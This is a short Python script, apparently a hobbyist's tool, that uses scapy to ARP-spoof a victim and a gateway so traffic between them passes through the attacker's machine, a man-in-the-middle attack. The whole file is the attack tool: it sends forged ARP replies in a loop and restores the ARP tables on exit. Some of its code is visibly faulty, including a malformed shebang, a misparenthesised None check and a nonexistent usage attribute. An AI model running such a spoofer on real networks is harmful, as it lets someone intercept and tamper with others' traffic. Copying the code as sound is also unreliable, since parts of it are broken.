#! usr/bin/python3
#____________________________ AUTORE: PROFFGIMS________________________________________________________________________
#____________________________DATE: 29 november 2021 : MY BIRDTHDAY_____________________________________________________
import time
import optparse
import scapy.all as scapy
#function to spoof
def spoofing(victimip, victimmac, gatewayip):
    packet = scapy.ARP(op=2, pdst= victimip, hwdst= victimmac, psrc= gatewayip)
    scapy.send(packet, verbose=False)

#function to resto allthing
def restor(victimip, victimmac, gatewayip, gatewaymac):
    packet = scapy.ARP(op=2, pdst= victimip, hwdst= victimmac,psrc= gatewayip, hwsrc= gatewaymac)
    scapy.send(packet, verbose=False, count=5)
#create parser
parser = optparse.OptionParser("Usage: mand in midlle attaque\n -v: victim ip\n -g gatway ip")
#add options  to parser
parser.add_option("-v", dest="victim", type= "string", help="victim ip")
parser.add_option("-g", dest="gateway", type="string", help='gateway ip')
#get options enter by user in options
options, args= parser.parse_args()
victim_ip = options.victim
gateway_ip = options.gateway
#check if user enter options
if victim_ip ==None | gateway_ip == None:
    #show how to use before exit
    print(parser.Usage)
    exit()

victim_mac = scapy.getmacbyip(victim_ip)
gateway_mac = scapy.getmacbyip(gateway_ip)

print(f"victim ip: {victim_ip} : victime mac : {victim_mac} \n gateway  ip : {gateway_ip} \n gateway mac : {gateway_mac} ")

#main programme
try:
    while True:
        spoofing(victim_ip, victim_mac, gateway_ip)
        spoofing(gateway_ip, gateway_mac, victim_ip)
        time.sleep(2)
except KeyboardInterrupt:
    restor(victim_ip, victim_mac,gateway_ip, gateway_mac)
    restor(gateway_ip, gateway_mac, victim_ip, victim_mac)
